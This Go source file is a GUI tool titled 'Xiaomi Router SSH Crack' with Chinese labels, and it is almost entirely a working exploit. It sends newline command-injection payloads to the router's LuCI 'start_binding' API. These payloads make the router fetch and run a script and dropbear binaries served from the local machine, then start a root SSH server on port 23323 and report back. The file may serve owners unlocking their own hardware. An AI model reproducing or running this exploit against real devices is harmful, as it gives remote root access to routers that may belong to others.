package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/widget"
)

var (
	localIPSelect  *widget.SelectEntry
	routerIPEntry  *widget.Entry
	tokenEntry     *widget.Entry
	logOutput      *widget.Entry
	runButton      *widget.Button
	closeButton    *widget.Button
	localIPOptions []string
	errorChan      chan error
)

const (
	port          = "8888"
	trigger       = "Generating 2048 bit rsa key"
	sshInfo       = "SSH 已开启. 使用root账户登录 %s:23323，密码通过SN码计算 https://mi.tellme.top/"
	serverMsg     = "HTTP服务已启动，监听地址:"
	urlFormat     = "http://%s/cgi-bin/luci/;stok=%s/api/xqsystem/start_binding"
	ping1Template = `mkdir -p /etc/config/dropbear
a=$(/tmp/dropbearkey -t rsa -f /etc/config/dropbear/dropbear_rsa_host_key 2>&1 | base64 -w 0)
/tmp/dropbear -r /etc/config/dropbear/dropbear_rsa_host_key -p 23323
wget "http://{{LOCAL_IP}}:{{PORT}}/$a"`
)

func main() {
	myApp := app.New()
	myWindow := myApp.NewWindow("Xiaomi Router SSH Crack")

	localIPs, err := getLocalIPs()
	if err != nil {
		log.Printf("获取本机IP失败: %v", err)
		localIPs = []string{"获取本机IP失败,请手动输入"}
	}
	localIPOptions = localIPs

	localIPSelect = widget.NewSelectEntry(localIPs) // 使用 NewSelectEntry

	routerIPEntry = widget.NewEntry()
	routerIPEntry.SetText("192.168.31.1")

	tokenEntry = widget.NewEntry()
	tokenEntry.SetPlaceHolder("请输入路由器token")

	logOutput = widget.NewMultiLineEntry()
	logOutput.SetPlaceHolder("日志输出...")
	logOutput.SetMinRowsVisible(5)

	errorChan = make(chan error)

	runButton = widget.NewButton("破解", func() {
		go runCrack(myWindow)
	})
	runButton.Importance = widget.HighImportance

	closeButton = widget.NewButton("关闭", func() {
		myWindow.Close()
		myApp.Quit()
	})

	buttonContainer := container.NewHBox(
		layout.NewSpacer(),
		runButton,
		closeButton,
		layout.NewSpacer(),
	)

	content := container.NewVBox(
		widget.NewLabel("本机IP:"),
		localIPSelect,
		widget.NewLabel("路由器IP:"),
		routerIPEntry,
		widget.NewLabel("路由器Token:"),
		tokenEntry,
		widget.NewLabel(""),
		buttonContainer,
		widget.NewLabel("日志输出:"),
		logOutput,
	)

	myWindow.SetContent(content)
	myWindow.Resize(fyne.NewSize(600, 400))

	go func() {
		for err := range errorChan {
			dialog.ShowError(err, myWindow)
		}
	}()

	myWindow.ShowAndRun()
}

/**
 * 点击按钮触发
 */
func runCrack(myWindow fyne.Window) {
	// 手动输入直接使用 localIPSelect.Text
	crack(localIPSelect.Text, myWindow)
}

/**
 * 执行命令
 */
func crack(localIP string, myWindow fyne.Window) {
	routerIP := routerIPEntry.Text
	token := tokenEntry.Text

	if localIP == "" || routerIP == "" || token == "" {
		dialog.ShowError(errors.New("请输入完整的参数！"), myWindow)
		return
	}
	if !isValidIPv4(localIP) {
		dialog.ShowError(fmt.Errorf("无效的本机IP地址: %s", localIP), myWindow)
		return
	}

	if !isValidIPv4(routerIP) {
		dialog.ShowError(fmt.Errorf("无效的路由器IP地址: %s", routerIP), myWindow)
		return
	}

	runButton.Disable()
	defer runButton.Enable()

	logOutput.SetText("")
	log.SetOutput(newLogWriter(logOutput))

	var wg sync.WaitGroup
	wg.Add(1)

	go func() {
		defer wg.Done()
		runServer(localIP, routerIP)
	}()

	if err := createPayload(localIP); err != nil {
		errorChan <- err
		return
	}
	if err := sendAndExecutePayload(routerIP, token, localIP); err != nil {
		errorChan <- err
		return
	}

	wg.Wait()
}

/**
 * 日志输出
 */
type logWriter struct {
	logOutput *widget.Entry
	buf       bytes.Buffer
}

func newLogWriter(logOutput *widget.Entry) *logWriter {
	lw := &logWriter{
		logOutput: logOutput,
	}
	go lw.flushPeriodically()
	return lw
}

func (lw *logWriter) Write(p []byte) (n int, err error) {
	lw.buf.Write(p)
	return len(p), nil
}

func (lw *logWriter) flushPeriodically() {
	for range time.Tick(time.Second) {
		if lw.buf.Len() > 0 {
			lw.logOutput.SetText(lw.logOutput.Text + lw.buf.String())
			lw.buf.Reset()
		}
	}
}

/**
 * 自定义HTTP服务
 */
type customHandler struct {
	routerIP string
}

func (h *customHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	decodedPath := r.URL.Path[1:]

	if _, err := os.Stat(decodedPath); err == nil {
		http.ServeFile(w, r, decodedPath)
		return
	}

	decodedMessage, err := base64.StdEncoding.DecodeString(decodedPath)
	if err != nil {
		http.NotFound(w, r)
		return
	}

	decodedStr := string(decodedMessage)
	if strings.HasPrefix(decodedStr, trigger) {
		log.Printf(sshInfo, h.routerIP)
		w.WriteHeader(http.StatusOK)
		go func() {
			time.Sleep(1 * time.Second)
			os.Exit(0)
		}()
		return
	}

	w.WriteHeader(http.StatusOK)
}

/**
 * 启动HTTP服务
 */
func runServer(localIP, routerIP string) {
	handler := &customHandler{routerIP: routerIP}
	server := &http.Server{
		Addr:         ":" + port,
		Handler:      handler,
		ReadTimeout:  5 * time.Second,
		WriteTimeout: 5 * time.Second,
	}

	log.Println(serverMsg, localIP+":"+port)

	if err := server.ListenAndServe(); !errors.Is(err, http.ErrServerClosed) {
		log.Printf("HTTP 启动失败: %v", err)
	}
}

/**
 * 创建payload文件
 */
func createPayload(localIP string) error {

	// 直接使用 ping1Template 变量
	content := strings.ReplaceAll(ping1Template, "{{LOCAL_IP}}", localIP)
	content = strings.ReplaceAll(content, "{{PORT}}", port)
	content = strings.ReplaceAll(content, "\r\n", "\n")
	content = strings.TrimSpace(content)

	// 将处理后的内容写入文件
	if err := os.WriteFile("ping1", []byte(content), 0644); err != nil {
		log.Printf("写入payload文件失败: %v", err)
		return err
	}
	return nil
}

/**
 * 下载文件并且执行命令
 */
func sendAndExecutePayload(routerIP, token, localIP string) error {
	url := fmt.Sprintf(urlFormat, routerIP, token)

	headers := map[string]string{
		"Host":                      routerIP,
		"Upgrade-Insecure-Requests": "1",
		"User-Agent":                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"Accept-Encoding":           "gzip, deflate",
		"Accept-Language":           "zh-CN,zh;q=0.9",
		"Connection":                "close",
		"Content-Type":              "application/x-www-form-urlencoded",
	}

	payloads := []string{
		fmt.Sprintf("uid=1234&key=1234'%%0Arm%%20-rf%%20/tmp/ping1%%0Awget%%20\"http://%s:%s/ping1\"%%20-P%%20/tmp'", localIP, port),
		fmt.Sprintf("uid=1234&key=1234'%%0Arm%%20-rf%%20/tmp/dropbear%%0Awget%%20\"http://%s:%s/dropbear\"%%20-P%%20/tmp'", localIP, port),
		fmt.Sprintf("uid=1234&key=1234'%%0Arm%%20-rf%%20/tmp/dropbearkey%%0Awget%%20\"http://%s:%s/dropbearkey\"%%20-P%%20/tmp'", localIP, port),
		"uid=1234&key=1234'%%0Achmod%%20%%2bx%%20/tmp/ping1%%0Achmod%%20%%2bx%%20/tmp/dropbear%%0Achmod%%20%%2bx%%20/tmp/dropbearkey%%0a/tmp/ping1'",
	}

	for _, payload := range payloads {
		if err := sendPostRequest(url, headers, payload); err != nil {
			return err
		}
	}
	return nil
}

/**
 * 发送POST请求
 */
func sendPostRequest(url string, headers map[string]string, payload string) error {
	req, err := http.NewRequest("POST", url, strings.NewReader(payload))
	if err != nil {
		log.Printf("创建HTTP请求失败: %v", err)
		return err
	}
	//填充header
	for key, value := range headers {
		req.Header.Set(key, value)
	}
	//跳过证书验证
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   5 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		log.Printf("发送HTTP请求失败: %v", err)
		return err
	}
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			return
		}
	}(resp.Body)

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		log.Printf("HTTP请求失败,状态码：%d, 响应: %s", resp.StatusCode, string(body))
		return fmt.Errorf("HTTP请求失败,状态码：%d", resp.StatusCode)
	}
	return nil
}

/**
 * 获取本机IP
 */
func getLocalIPs() ([]string, error) {
	var ips []string
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return nil, err
	}
	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				ips = append(ips, ipnet.IP.String())
			}
		}
	}
	return ips, nil
}

func isValidIPv4(ip string) bool {
	parsedIP := net.ParseIP(ip)
	return parsedIP != nil && parsedIP.To4() != nil
}
